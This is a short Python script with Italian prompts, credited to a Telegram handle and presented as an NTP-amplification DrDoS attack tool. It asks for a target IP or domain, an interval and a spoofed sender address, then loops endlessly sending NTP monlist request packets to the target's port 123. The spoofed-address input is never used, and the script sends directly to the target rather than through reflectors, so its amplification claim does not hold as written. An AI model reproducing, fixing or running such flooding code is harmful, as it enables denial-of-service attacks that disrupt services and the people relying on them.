print("\033[1;31m__        ")
print("\033[1;31m\  / | |__/ | |\ | / _`       ")
print("\033[1;31m \/  | |  \ | | \| \__>       ")
print("\033[0m")

import socket
import time

def invia_pacchetto_ntp(destinazione, porta, intervallo, mittente, count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        payload = bytearray([0x17, 0x00, 0x03, 0x2a] + [0x00] * 43)  # Utilizza una richiesta NTP monlist
        sock.sendto(payload, (destinazione, porta))
        print("\033[1;32mPacchetto NTP inviato con successo a {}\033[0m".format(destinazione))
        if count % 50 == 0:
            print("\033[1;34m----> 50 pacchetti inviati <----\033[0m")
    except Exception as e:
        print("\033[1;31mErrore durante l'invio del pacchetto NTP a {}: {}\033[0m".format(destinazione, e))
    finally:
        sock.close()

print("\033[1;32mAttacco DrDoS tramite NTP Amplification\nby t.me/VikingTERMINAL\033[0m")
destinazione = input("\033[1;35mInserisci l'indirizzo IP o il dominio per effettuare l'attacco: \033[0m")
porta = 123
intervallo = float(input("\033[1;35mInserisci l'intervallo tra i pacchetti (in secondi): \033[0m"))
mittente = input("\033[1;35mInserisci l'indirizzo IP del mittente falsificato: \033[0m")
count = 0

while True:
    invia_pacchetto_ntp(destinazione, porta, intervallo, mittente, count)
    count += 1
    time.sleep(intervallo)
